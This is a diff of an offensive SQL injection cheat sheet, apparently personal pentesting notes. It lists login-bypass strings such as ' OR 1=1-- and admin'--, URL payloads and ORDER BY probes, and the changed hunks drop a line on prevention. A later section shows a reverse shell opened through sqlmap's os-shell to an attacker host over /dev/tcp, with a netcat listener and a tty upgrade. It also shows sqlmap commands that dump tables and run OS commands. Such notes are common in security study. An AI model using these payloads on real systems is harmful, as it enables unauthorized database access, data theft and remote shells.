@@ -1,28 +1,26 @@
 Databases
 
 
-Structured Query Language (SQL)
-Can be prevent by doing input validation, parameterized queries, stored procedures, and implementing a Web Application Firewall (WAF).
-
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # SQL Injection
 
-Add the following examples to input fields or at the end of a URL.
--- is a comment indicator, this effectively removes the remainder of the query.
+- Bypass a login screen
+generic: ' OR 1=1--
+Windows server: admin'--
+Linux server: root'--
+password: test
 
-'+OR+1=1--
+Add the following examples to input fields or at the end of a URL.
+' OR 1=1--
 http://target.com/products?category=cars'+OR+1=1--
 
+-- is a comment indicator, this effectively removes the remainder of the query.
+If -- gives an error, use #. Example: ' ORDER BY 1#
+You can also use + for blank spaces. Example: '+OR+1=1--
+
 - Other strings that might work
-' OR 1=1--
 ' OR 2=2--
 ' OR 2-1=1--
 ' OR 2>1--
-
-- Bypass a login screen for the admin account
-Enter the following for the username: admin'--
-password: test
 
 - UNION attack
 The UNION keyword lets you execute an additional SELECT query and append the results to the original query.
@@ -36,13 +34,6 @@ Continue increasing the number until you get an error.
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
-
-If -- gives an error, use #. Example: ' ORDER BY 1#
-You can also use + for blank spaces. Example: '+ORDER+BY+1--
-
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL--
 
 Find the column that contains string data.
 This depends on the number of columns you discovered above.
@@ -365,8 +356,9 @@ nc -lvnp 443
 - Use sqlmap to make the shell more stable.
 os-shell> bash -c "bash -i >& /dev/tcp/attacker IP/443 0>&1"
 
-- Use Terminal to quickly make the shell fully interactive.
+- Upgrade your shell to a fully interactive tty shell:
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+
 ctrl+z
 stty raw -echo
 fg
@@ -382,4 +374,3 @@ sqlmap -r tmp --force-ssl --batch -D <database> -T <table> --dump
 sqlmap -r tmp --force-ssl --batch --os-cmd id
 sqlmap -r tmp --force-ssl --batch --os-cmd whoami
 sqlmap -r tmp --force-ssl --batch --os-shell
-
